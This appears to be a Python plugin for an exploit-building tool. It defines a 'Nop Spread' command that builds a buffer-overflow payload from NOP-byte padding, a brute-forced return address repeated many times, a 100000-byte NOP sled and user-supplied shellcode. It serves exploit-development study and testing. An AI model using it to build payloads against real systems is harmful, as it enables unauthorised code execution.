#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from Command import Command
from utils import format_hex_value


class NopSpreadCommand(Command):
    command = "nsp"
    usage = "[buffer potential addr.]"
    help = "\tDo Nop Spread."

    def set_option(self, option, cmd):

        option.bruteforce = True

        addr = format_hex_value(cmd[1], option)

        if option.buffSize:
            option.payload = '"\\x90" * ' + str(option.buffSize) + ' + "' + addr + '"'
        else:
            option.payload = '"' + addr + '" * 500'

        option.payload += ' + "\\x90" * 100000 + "' + option.shellcode + '"'
